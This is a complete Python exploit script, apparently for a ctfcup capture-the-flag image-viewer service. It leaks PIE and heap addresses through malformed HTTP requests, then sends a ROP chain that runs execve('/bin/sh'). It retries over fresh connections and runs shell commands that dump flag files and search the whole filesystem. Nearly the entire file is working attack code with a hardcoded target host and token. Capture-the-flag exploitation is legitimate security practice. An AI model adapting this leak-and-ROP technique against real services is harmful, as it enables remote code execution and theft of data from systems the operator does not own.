#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ctfcup image-viewer exploit -- retries every step, survives a flaky wrapper.

    python3 go3.py [host] [port] [token]

1. leak with retries (token + sep + HTTP in ONE write)
2. exploit with retries: every attempt is a fresh connection (= fresh fork,
   same heap layout), so the leaked addresses stay valid
3. after each attempt the shell commands are pushed several times
"""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "instances.ctfcup.online"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
TOKEN = sys.argv[3] if len(sys.argv) > 3 else "5CYH8BZ95GHQV3IYLDJS83X0HIXSSQTG"

W = H = 4
S = W * H * 3
BLEN = 18 + 1 + 384
LVT, LRET, PRDI, PRSI, PRAX, SYSC = 0x206db8, 0xcf7b1, 0x1cca4, 0x239af, 0x3b4aa, 0x155ed5
SEPS = [b"\r\n", b"\n"]

CMD = (b"echo ---PWNED---; id; "
       b"cat /flag /flag.txt /flag_*.txt /app/flag* /home/*/flag* 2>/dev/null; "
       b"grep -rho --binary-files=text 'ctfcup{[^}]*}' / 2>/dev/null | head -5; "
       b"echo ---END---\n")


def req(gamma, payload):
    d = struct.pack("<BBBHHBHHHHBB", 0, 0, 10, 0, 0, 0, 0, 0, W, H, 24, 0) + payload
    d += b"\x00" * (BLEN - len(d))
    d = d[:BLEN]
    head = ("POST /process HTTP/1.1\r\nHost: x\r\nContent-Length: %d\r\nX-Filter: warm\r\n"
            "X-Preview-Size: %d\r\nX-Preview-Offset: 0\r\nX-Preview-Length: 1024\r\n"
            "X-Preview-Depth: 2000000000\r\nX-Scale: 1\r\nX-Gamma: %s\r\n\r\n"
            % (BLEN, S, gamma))
    return head.encode() + d


def rd(s, wait):
    s.settimeout(wait)
    out = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            return out, "open"
        except ConnectionResetError:
            return out, "reset"
        if not d:
            return out, "closed"
        out += d


def exchange(reqbytes, sep, wait=12.0):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(wait)
    try:
        s.sendall(TOKEN.encode() + sep + reqbytes)
        return rd(s, wait)
    finally:
        try:
            s.close()
        except OSError:
            pass


def parse_leak(body):
    i = body.find(b"HTTP/")
    if i < 0:
        return None
    _, _, d = body[i:].partition(b"\r\n\r\n")
    if len(d) < 0x100:
        return None
    for o in range(0, len(d) - 0x20, 8):
        vt = struct.unpack_from("<Q", d, o)[0]
        if vt < 0x1000:
            continue
        pie = vt - LVT
        if pie % 0x1000 == 0 and 0x40000000 <= pie < 0x800000000000:
            view, temp = struct.unpack_from("<QQ", d, o + 8)
            if view and temp and 0 < temp - view < 0x1000:
                return pie, view, view + o, temp
    return None


def leak(rounds=15):
    print("[*] step 1/2: heap leak ...")
    for i in range(rounds):
        sep = SEPS[i % 2]
        try:
            body, st = exchange(req("0", bytes([127 + 16]) + b"\x11\x22\x33"), sep, 12.0)
        except OSError as e:
            print("    leak %2d sep=%-4r -> %s" % (i + 1, sep, e))
            time.sleep(2.0)
            continue
        info = parse_leak(body)
        print("    leak %2d sep=%-4r -> %-6s %5d B %s"
              % (i + 1, sep, st, len(body), "OK" if info else ""))
        if info:
            return info, sep
        time.sleep(2.0 + i % 3)
    return None, None


def build(pie, F, dl):
    b = bytearray(b"\x90" * 384)

    def put(o, v):
        struct.pack_into("<Q", b, o, v)

    put(dl, F + 0x100)
    put(dl + 8, pie + PRDI)
    put(dl + 0x10, F + 0x120)
    put(dl + 0x18, pie + PRSI)
    put(dl + 0x20, 0)
    put(dl + 0x28, pie + PRAX)
    put(dl + 0x30, 59)
    put(dl + 0x38, pie + SYSC)
    put(dl + 0x110, pie + LRET)
    b[dl + 0x120:dl + 0x128] = b"/bin/sh\x00"
    return bytes([127]) + bytes(b)


def main():
    print("[*] %s:%d" % (HOST, PORT))
    info, sep0 = leak()
    if not info:
        print("[!] no usable leak after 15 rounds (wrapper is dropping connections)")
        return 1
    pie, view, F, temp = info
    print("[+] pie=%#x view=%#x temp=%#x filter=%#x" % (pie, view, temp, F))
    dl = F - temp
    if not 0x40 <= dl <= 0x100:
        print("[!] unexpected layout delta=%#x" % dl)
        return 2
    payload = build(pie, F, dl)

    print("[*] step 2/2: exploit (retrying on fresh connections) ...")
    for attempt in range(20):
        sep = SEPS[attempt % 2]
        try:
            s = socket.create_connection((HOST, PORT), timeout=10)
            s.settimeout(12)
            s.sendall(TOKEN.encode() + sep + req("0", payload))
        except OSError as e:
            print("    exploit %2d -> connect error %s" % (attempt + 1, e))
            time.sleep(2.0)
            continue
        time.sleep(0.7)
        out = b""
        for _ in range(8):
            try:
                s.sendall(CMD)
            except OSError:
                break
            chunk, st = rd(s, 2.5)
            out += chunk
            if b"PWNED" in out:
                break
        try:
            s.close()
        except OSError:
            pass
        txt = out.decode("latin1", "replace")
        print("    exploit %2d sep=%-4r -> %4d B %s"
              % (attempt + 1, sep, len(out), "SHELL!" if "PWNED" in txt else ""))
        if "PWNED" in txt:
            print("\n" + txt)
            if "---END---" not in txt:
                print("[i] command output may be partial; rerun or use the shell again")
            return 0
        time.sleep(2.0 + attempt % 3)
    print("[!] exploit did not take after 20 attempts")
    print("    the service answers the leak, so the handshake is fine:")
    print("    -> likely every exploit connection was dropped before reaching the backend")
    print("    -> try again after a pause, or re-issue the instance (fresh fork = same layout)")
    return 3


sys.exit(main())
